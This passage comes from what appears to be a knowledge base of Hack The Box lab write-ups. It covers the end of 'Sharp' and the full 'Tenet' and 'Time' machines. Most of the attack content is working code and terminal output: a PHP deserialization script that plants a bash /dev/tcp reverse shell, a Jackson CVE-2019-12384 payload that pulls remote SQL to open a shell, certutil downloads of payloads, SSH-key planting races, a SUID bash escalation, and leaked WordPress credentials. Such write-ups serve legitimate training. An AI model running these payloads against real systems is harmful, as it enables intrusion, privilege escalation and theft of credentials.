PS C:\users\lars\documents> certutil -urlcache -split -f "http://10.10.14.5/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll
****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.
PS C:\users\lars\documents> certutil -urlcache -split -f "http://10.10.14.5/WcfClient.exe" WcfClient.exe
****  Online  ****
  0000  ...
  1400
CertUtil: -URLCache command completed successfully.
PS C:\users\lars\documents> dir


    Directory: C:\users\lars\documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/15/2020   1:40 PM                wcf
-a----         1/9/2021   6:51 PM           5120 WcfClient.exe
-a----         1/9/2021   6:50 PM           7680 WcfRemotingLibrary.dll
```

#### Privilege Escalation

In powershell, we can execute this client via

``` bash
PS C:\users\lars\documents> .\WcfClient.exe http://10.10.14.5/Invoke-PowerShellTcp.ps1
```

 - Be sure you have a netcat reverse shell waiting.

``` bash
D:\1.pentesttool\内网渗透>nc.exe -lvp 4322
listening on [any] 4322 ...
connect to [10.10.14.5] from DESKTOP-9LSPC40 [10.10.10.219] 49692
Windows PowerShell running as user SHARP$ on SHARP
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> cd /users/administrator/desktop
PS C:\users\administrator\desktop> dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---         1/7/2021   2:17 PM             34 root.txt                                                               


PS C:\users\administrator\desktop> cat root.txt
5a631ff304d673cdd9f775ce5bc81879
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb154.jpg)

And we're root! This Shell won't last long, so be careful!

 - If you want to do post-root activities, upload a netcat binary and have the new system shell quickly use this binary to create a new reverse shell.

use mimikatz to retrieve the admin's hash, for persistence.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb155.jpg)

#### Summary of knowledge

 - SMB enumeration
 - ack tool usage
 - reset password by remove the existing password fields
 - make Lars admin in the config file to get Administrator’s pass
 - De-compiling and compiling file use dnspy
 - use ExploitRemotingService and ysoserial.net and nc.exe to get a reverse shell
 - powershell commands to zip and move files
 - use certutil -urlcache -split -f "" to download files
 - make use of service running as a privileged user to escalate to administrator

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end sharp -->

</details>

<a id="case-tenet"></a>

## PHP 对象析构与密钥写入竞态

原链由 PHP 对象注入得到执行，再追踪 root authorized_keys 写入脚本的时序。备份文件、序列化对象与竞态操作完整保留。

<p class="kb-provenance">来源 tenet · 原记录 2021-01-18 · 13 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-tenet">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start tenet -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	16 Jan 2021
IP:	10.10.10.223

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb161.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tenet]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.223
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### WEBSITE

It’s just a Default page :/ nothing there, let’s add tenet.htb to our /etc/hosts file

Yep, there’s a vhost running there and its tenet.htb, Let’s enum there for sometime

I just scrolled down and got a Recent comments section, when I click that It takes me to the comments page

So note here a user commented, “did you remove the sator php file and the backup?”

also we got a username (neil) here take a note of it 🙂

I enumed for sometime and stucked here for sometime, they’re saying we migrating, so looks like there’s another vhost and It would be sator coz the user talking about it

So I added sator.tenet.htb to my /etc/hosts

It worked 🙂 but now I’m trying to find that php backup file, so I got 404 here. let me back when I find that file :/

``` bash
http://sator.tenet.htb/sator.php
```

Somehow I managed to find the file but I can’t able to read it :/

When I added .bak to the url, I can able to download it 😀

And here's that file👇

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tenet]
└─# cat sator.php.bak 
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

We need to perform php object Injection also called as deserialization

If you’re new to this topic then you must go through these things, then you can able to understand this exploit

 - FOR REFERENCE:

 - [Intro to PHP Deserialization](https://www.youtube.com/watch?v=HaW15aMzBUM&feature=youtu.be)

 - [Exploiting PHP deserialization](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)


#### EXPLOITING PART

So here I made a file to get shell in just one command

 - getShell.php

``` bash
<?php
class DatabaseExport
{
        public $user_file = 'revshell.php';
                                               //Change YOUR IP AND PORT HERE vvvvvvvvv
        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.2/5555 0>&1\'"); ?>';
        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[EXPLOITED] Check your netcat :D   [FOLLOW lUc1f3r11]';
        }
}
$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport));
$response = file_get_contents("$url");
$response = file_get_contents("http://10.10.10.223/revshell.php");
?>
```

Just you need to change the IP and port in the 6th line and I marked it too,

Then start your netcat and run this file, php getShell.php

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tenet]
└─# php getshell.php 
[EXPLOITED] Check your netcat :D   [FOLLOW lUc1f3r11]
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tenet]
└─# nc -lvp 5555
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.10.223.
Ncat: Connection from 10.10.10.223:40482.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
python -c 'import pty; pty.spawn("/bin/bash")'
You also have python3 installed, you can run 'python3' instead.

python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@tenet:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@tenet:/var/www/html$ ls
ls
index.html    sator.php      shell.php  wordpress
revshell.php  sator.php.bak  users.txt
```

#### WWW-DATA to USER

Remember this is a wordpress site so we need to find credentials based on that,

So as I said we need to enum based on wordpress name, then I got creds for the user neil in /var/www/html/wordpress folder and filename “wp-config.php”

ssh into the box

``` bash
www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'WP_HOME', 'http://tenet.htb');
define( 'WP_SITEURL', 'http://tenet.htb');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc>5qKr`T}(t?+`r.+`gg,Ul,=!xy6d' );
define( 'SECURE_AUTH_KEY',  'x3q&hwYy]:S{l;jDU0D&./@]GbBz(P~}]y=3deqO1ZB/`P:GU<tJ[v)4><}wl_~N' );
define( 'LOGGED_IN_KEY',    'JrJ_u34gQ3(x7y_Db8`9%@jq<;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu' );
define( 'NONCE_KEY',        '=z0ODLKO{9K;<,<gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&0:ajW#' );
define( 'AUTH_SALT',        '*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA<E5Vp#N[a{YL TY^-Q[X++u@Ab' );
define( 'SECURE_AUTH_SALT', 'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h' );
define( 'LOGGED_IN_SALT',   'd14m0mBP eIawFxLs@+CrJz#d(88cx4||<6~_U3F=aCCiyN|]Hr{(mC5< R57zmn' );
define( 'NONCE_SALT',       'Srtt&}(~:K(R(q(FMK<}}%Zes!4%!S`V!KSk)Rlq{>Y?f&b`&NW[INM2,a9Zm,SH' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tenet]
└─# ssh neil@10.10.10.223
The authenticity of host '10.10.10.223 (10.10.10.223)' can't be established.
ECDSA key fingerprint is SHA256:WV3NcHaV7asDFwcTNcPZvBLb3MG6RbhW9hWBQqIDwlE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.223' (ECDSA) to the list of known hosts.
neil@10.10.10.223's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 18 04:51:48 UTC 2021

  System load:  0.0                Processes:             176
  Usage of /:   15.4% of 22.51GB   Users logged in:       0
  Memory usage: 14%                IP address for ens160: 10.10.10.223
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.


Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
neil@tenet:~$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:~$ whoami
neil
neil@tenet:~$ ls
user.txt
neil@tenet:~$ cat user.txt
b7ec0d7ccbebbfaf18eb70dc14bce4f7
```

and we got user.txt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb162.jpg)


#### USER to ROOT

when I tried sudo -l it showed me neil(user) can run the file “/usr/local/bin/enableSSH.sh”

``` bash
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

So that’s the thing we need to use to privesc, Here’s that file

``` bash
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

So by running this we can add our .pub key to root’s authorized_keys 🙂

privesc was pretty simple 😀

So I created a simple script to add my pub key to “/root/.ssh/authorized_keys”

also I created a loop here to run it multiple times

 - root.sh

``` bash
while true
do
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali" | tee /tmp/ssh-*
done
```

create this file on /home/neil directory

Listen here we need 3 terminals to root

 - To run our root.sh file
 - To run that enableSSH.sh file (make sure run it as sudo)
 - To log in as root

You need to do this multiple times, I tried it more than 25 times then I got root shell

``` bash
for i in {1..10000}
do
sudo enableSSH.sh 
done
```

many people trying this so don’t get angry try it more time sure you’ll get root shell 😀 or reset it and try again

``` bash
┌──(root💀kali)-[~]
└─# ssh -i /root/.ssh/id_rsa root@10.10.10.223                                                                                                        
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 18 05:27:48 UTC 2021

  System load:  0.33               Processes:             209
  Usage of /:   15.1% of 22.51GB   Users logged in:       1
  Memory usage: 9%                 IP address for ens160: 10.10.10.223
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 13 08:03:48 2021
root@tenet:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tenet:~# whoami
root
root@tenet:~# ls
root.txt
root@tenet:~# cat root.txt
3673382097770d93aaf70d520ba508af
```

and we got root.txt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb163.jpg)

#### Summary of knowledge

 - use php deserialization getshell
 - add .pub key to root’s authorized_keys to privesc

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end tenet -->

</details>

<a id="case-time"></a>

## Jackson 类型绑定与可写任务

JSON 校验错误暴露 Jackson 类型处理，原文保留数组与对象输入的差异、H2 相关链及两条任务文件提权方法。

<p class="kb-provenance">来源 time · 原记录 2020-11-07 · 15 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-time">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start time -->

#### introduce

OS: Linux
Difficulty: Medium
Points:	30
Release:	24 Oct 2020
IP:	10.10.10.214

User Blood Sp3eD 00 days, 00 hours, 08 mins, 51 seconds.
Root Blood Sp3eD 00 days, 00 hours, 17 mins, 49 seconds.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb113.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
root@kali:~/hackthebox/machine/time# nmap -sV -v -p- 10.10.10.214 --min-rate=10000
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### port 80

There is a simple JSON Beautifier and Validator.
Let's try something Simple means "test" in Beautifier.
It's said null.
Let's try in Validator and he also in beta testing.
It's give some error.

``` bash
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
```

com.fasterxml.jackson.core looks interesting. google it and find something.

 - [Understanding insecure implementation of Jackson Deserialization](https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038)

After reading the article , try this command Let's see how's it's work.

``` bash
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

search it on google and check any solution for this error.

 - [com.fasterxml.jackson.databind.exc.MismatchedInputException](https://stackoverflow.com/questions/49822202/com-fasterxml-jackson-databind-exc-mismatchedinputexception-unexpected-token-s)

This stack overflow gave us the solution of our problem that we need to use '[]' instead of '{}'. Let's try this real quick.

``` bash
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'test' as a subtype of [simple type, class java.lang.Object]: no such class found
```

We got the error but it is different one. It's say "Could not resolve type id 'test', no class found".

After a few google search i found the interesting

 - [CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384)

#### exploit

1. step1

Create a file inject.sql Change the ip and port.

``` bash
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.2/3344 0>&1 &')
```

2. step2

Start python server and netcat Listener.

``` bash
root@kali:~/hackthebox/machine/time# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

3. step3

Go on the website select "Validate (beta!)" and input this:
Change the ip address also.

``` bash
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.2/inject.sql'"}]
```

And we got the shell and also get user flag.

``` bash
root@kali:~# nc -lvp 3344
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::3344
Ncat: Listening on 0.0.0.0:3344
Ncat: Connection from 10.10.10.214.
Ncat: Connection from 10.10.10.214:60198.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ id
id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
pericles@time:/var/www/html$ whoami
whoami
pericles
pericles@time:/var/www/html$ cd
cd
bash: cd: HOME not set
pericles@time:/var/www/html$ cd ~
cd ~
pericles@time:/home/pericles$ ls
ls
snap
user.txt
pericles@time:/home/pericles$ cat user.txt
cat user.txt
f1cd7712d0ea3d98f672c90c975aa156
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb114.jpg)

put the ssh public key and get the ssh connection.

``` bash
pericles@time:/home/pericles$ mkdir .ssh
mkdir .ssh
pericles@time:/home/pericles$ ls -la
ls -la
total 48
drwxr-xr-x 8 pericles pericles 4096 Nov  7 09:04 .
drwxr-xr-x 3 root     root     4096 Oct  2 13:45 ..
lrwxrwxrwx 1 root     root        9 Oct  1 15:05 .bash_history -> /dev/null
-rw-r--r-- 1 pericles pericles  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 pericles pericles 3771 Feb 25  2020 .bashrc
drwx------ 2 pericles pericles 4096 Sep 20 13:53 .cache
drwx------ 3 pericles pericles 4096 Oct 22 17:45 .config
drwx------ 2 pericles pericles 4096 Nov  6 19:31 .gnupg
lrwxrwxrwx 1 root     root        9 Oct  1 15:07 .lhistory -> /dev/null
drwxrwxr-x 3 pericles pericles 4096 Sep 29 12:52 .local
-rw-r--r-- 1 pericles pericles  807 Feb 25  2020 .profile
drwxr-xr-x 2 pericles pericles 4096 Nov  7 09:04 .ssh
drwxr-xr-x 3 pericles pericles 4096 Oct  2 13:20 snap
-r-------- 1 pericles pericles   33 Nov  6 13:19 user.txt
pericles@time:/home/pericles$ cd .ssh
cd .ssh
pericles@time:/home/pericles/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali" > authorized_keys
<BVy2VaufcRbiBDD6cTS00= root@kali" > authorized_keys
pericles@time:/home/pericles/.ssh$ ls
ls
authorized_keys
```

now connect to ssh shell

``` bash
root@kali:~/hackthebox/machine/time# chmod 600 id_rsa 
root@kali:~/hackthebox/machine/time# ssh -i id_rsa pericles@10.10.10.214
The authenticity of host '10.10.10.214 (10.10.10.214)' can't be established.
ECDSA key fingerprint is SHA256:sMBq2ECkw0OgfWnm+CdzEgN36He1XtCyD76MEhD/EKU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.214' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 07 Nov 2020 09:07:07 AM UTC

  System load:             0.75
  Usage of /:              23.7% of 29.40GB
  Memory usage:            33%
  Swap usage:              0%
  Processes:               249
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:da3d


83 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Oct 23 09:19:19 2020 from 10.10.14.5
pericles@time:~$ id
uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
pericles@time:~$ whoami
pericles
```

#### Privilege escalation

run the LinEnum

 - [privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

Found interesting file in LinEnum result.

``` bash
/bin/bash /usr/bin/timer_backup.sh
```

check we have any rights to write the file or not.

``` bash
pericles@time:~$ ls -la /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Nov  7 09:15 /usr/bin/timer_backup.sh
```

We have Permission to write the file. Let's replace root SSH_PUB_KEY with our's ssh public key.

``` bash
pericles@time:~$ echo "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
pericles@time:~$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali >> /root/.ssh/authorized_keys
```

now ssh in and we got root.

``` bash
root@kali:~/hackthebox/machine/time# ssh -i id_rsa root@10.10.10.214
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 07 Nov 2020 09:19:05 AM UTC

  System load:             0.0
  Usage of /:              23.8% of 29.40GB
  Memory usage:            33%
  Swap usage:              0%
  Processes:               250
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:da3d


83 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Oct 22 17:03:52 2020
root@time:~# id
uid=0(root) gid=0(root) groups=0(root)
root@time:~# whoami
root
root@time:~# ls
backup.zip  root.txt  snap  timer_backup.sh
root@time:~# cat root.txt
4061f1369e60de8e0c1522bdd4421ecb
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb115.jpg)

#### Privilege escalation 2

``` bash
pericles@time:~$ echo "chmod +s /bin/bash" >> /usr/bin/timer_backup.sh
pericles@time:~$ /bin/bash -p
bash-5.0# id
uid=1000(pericles) gid=1000(pericles) euid=0(root) egid=0(root) groups=0(root),1000(pericles)
bash-5.0# whoami
root
bash-5.0# ls
snap  user.txt
bash-5.0# cd /root
bash-5.0# cat root.txt
4061f1369e60de8e0c1522bdd4421ecb
```

#### Summary of knowledge

 - Jackson Deserialization
 - CVE-2019-12384 exploit
 - file permission to excecute

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

